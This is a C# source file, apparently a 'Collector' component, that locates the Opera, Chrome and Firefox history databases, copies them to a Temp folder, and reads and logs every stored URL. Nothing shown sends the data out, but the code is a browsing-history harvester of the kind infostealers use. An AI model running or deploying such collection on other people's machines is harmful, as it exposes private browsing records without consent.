using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SQLite;
using System.IO;



namespace Collector
{
    class Locator
    {
        string username = Environment.UserName;
        string domain = Environment.UserDomainName;
        string currentUsername;
        int i; 
        string source;
        string destination;

        public void VariableDirectory()
        {
            // check if there is a directory with username.domain(foobar.NTHDOMAIN) as folder name under Users.
            // if none use username only (foobar)
            if (File.Exists(@"C:\Users\" + username+"."+domain))
            {
                // username.domain
               currentUsername = username+"."+domain;                
            }
            else
            {
                // username
               currentUsername = username;
            }    
                  
        }

        public void OperaLocator()
        {
            // Opera source file and destination file
            string sourceOpera = @"C:\Users\" + currentUsername + @"\AppData\Roaming\Opera Software\Opera Stable\History";
            source = sourceOpera;
            destination = @"C:\Users\" + currentUsername + @"\AppData\LocalLow\Temp\h_opera";
            i = -1;
        }

        public void ChromeLocator()
        {
            // Chrome source file and destination file
            string sourceChrome = @"C:\Users\" + currentUsername + @"\AppData\Local\Google\Chrome\User Data\Default\History";
            destination = @"C:\Users\" + currentUsername + @"\AppData\LocalLow\Temp\h_chrome";
            source = sourceChrome;
            i = 0;
        }
    
        public void MozillaLocator()
        {

            // Mozilla source file and destination file
            // Mozilla Firefox has a unique naming of application data
            string partial_path = ".default";
            string sourceMozilla = @"C:\Users\" + currentUsername + @"\AppData\Roaming\Mozilla\Firefox\Profiles\";

             DirectoryInfo dirInfo = new DirectoryInfo(sourceMozilla);
            // Get directories containg .default word
             DirectoryInfo[] dir = dirInfo.GetDirectories("*" + partial_path);
             List<string> unique_dir = new List<string>();
            
             foreach (DirectoryInfo foundDir in dir)
             {
               unique_dir.Add(foundDir.ToString());             
             }
            // Console.WriteLine(unique_dir[0]);
            // build the origin of the file
            source = sourceMozilla + unique_dir[0] + @"\places.sqlite";
            destination = @"C:\Users\" + currentUsername + @"\AppData\LocalLow\Temp\h_mozilla";
            i = 1;
        }

        public void Reader()
        {
            try
            {
                // Connection string
                string[] sql = { "select * from urls", "select * from moz_places" };

                SQLiteConnection con = new SQLiteConnection(@"Data Source=" + destination);
                con.Open();
                SQLiteCommand cmd = new SQLiteCommand();
                cmd.Connection = con;
                    if (i == -1 || i == 0)
                    {
                        // query for Opera and Chrome
                        cmd.CommandText = sql[0];
                    }
                    else if (i == 1)
                    {
                        // query for Mozilla
                        cmd.CommandText = sql[1];
                    }
                
                SQLiteDataReader dr = cmd.ExecuteReader();

                while (dr.Read())
                {
                    // Log history
                    new LogWriter(dr[0].ToString() + " | " + dr[1].ToString());
                    // Console.WriteLine(dr[0].ToString() + " | " + dr[1].ToString());                                        
                }
            }
            catch(Exception ex)
            {
                // Console.WriteLine(ex.Message);
                new LogWriter(ex.Message);
            }
        }

        public void CopyFile()
        {
            try
            {
                // Create file stream variable
                // Close filestream
                // If not closed, will caught an exception saying file used by another process
                // Copy file to new directory
                var filestream = File.Create(destination);
                filestream.Close();
                File.Copy(source,destination,true);

                Console.WriteLine(source + " copied to " + destination);
                new  LogWriter(source + " copied to " + destination);
                
            }
            catch(IOException ex)
            {
                // Console.WriteLine(ex.Message);
                new LogWriter(ex.Message);
            }
        }

    }
    
}
            